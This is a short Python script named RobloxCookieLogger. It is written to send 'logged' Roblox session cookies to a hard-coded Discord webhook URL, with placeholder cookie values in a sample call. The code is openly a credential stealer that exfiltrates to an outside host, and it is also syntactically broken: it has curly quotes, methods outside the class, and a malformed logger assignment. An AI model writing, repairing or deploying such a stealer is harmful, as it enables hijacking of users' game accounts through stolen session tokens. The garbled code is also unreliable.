import requests
class RobloxCookieLogger:
    “”“
    Class to handle the Roblox cookie logging operation.
Attributes:
- webhook_url: str
    The URL of the webhook where the logged cookies will be sent.
"""

def __init__(self, webhook_url: str):
    """
    Constructor to instantiate the RobloxCookieLogger class.

    Parameters:
    - webhook_url: str
        The URL of the webhook where the logged cookies will be sent.
    """

    self.webhook_url = webhook_url

def log_cookies(self, cookies: dict):
    """
    Sends the logged cookies to the specified webhook URL.

    Parameters:
    - cookies: dict
        A dictionary containing the logged cookies.

    Raises:
    - ValueError:
        Will raise an error if the webhook URL is not provided.
    """

    # Checking if the webhook URL is provided
    if not self.webhook_url:
        raise ValueError("Webhook URL is not provided.")

    # Sending the cookies to the webhook URL
    response = requests.post(self.webhook_url, json=cookies)

    # Checking the response status code
    if response.status_code == 200:
        print("Cookies logged successfully.")
    else:
        print("Failed to log cookies.")

logger = https://discord.com/api/webhooks/1427443110862000199/_fHCkbtJ_CnaZBvcJxJjUKC6hn1hsrzePXTfrqKxNgnr33pFQhzYtZLVxYFyx46gWDO5”)
cookies = {
    “cookie1”: “value1”,
    “cookie2”: “value2”,
    “cookie3”: “value3”
}
logger.log_cookies(cookies)
